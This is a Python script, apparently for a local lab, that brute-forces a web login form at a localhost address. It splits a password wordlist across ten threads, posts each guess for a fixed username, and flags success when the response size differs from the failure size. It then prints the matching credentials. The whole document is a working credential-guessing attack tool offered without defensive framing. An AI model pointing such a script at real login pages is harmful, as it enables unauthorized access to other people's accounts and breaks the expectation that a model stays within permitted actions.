import requests

from typing import List
from threading import Thread

TARGET_URL = "http://127.0.0.1:5000/login"
LOGIN = "aboba"
WRONG_SIZE = 1342
THREADS_NUM = 10

STOP = False

def bruteforce(wordlist: List[str]):
    global STOP
    
    with requests.Session() as sess:
        for password in wordlist:
            if STOP:
                return
            payload = {"login": LOGIN, "password": password.strip()}
            response = sess.post(TARGET_URL, data=payload)
            if len(response.content) != WRONG_SIZE:
                STOP = True
                print(f"[SUCCESS] ПРАВИЛЬНЫЕ УЧЁТНЫЕ ДАННЫЕ:\n{payload}")
                return
            print(f"[INFO] {password}")
            
            
if __name__ == "__main__":
    with open("./wordlist.txt", "r", encoding="UTF-8", errors="ignore") as f:
        wordlist = f.readlines()
        length = len(wordlist)
        step = length // THREADS_NUM
        for i in range(0, length, step):
            Thread(target=bruteforce, args=(wordlist[i:i+step],)).start()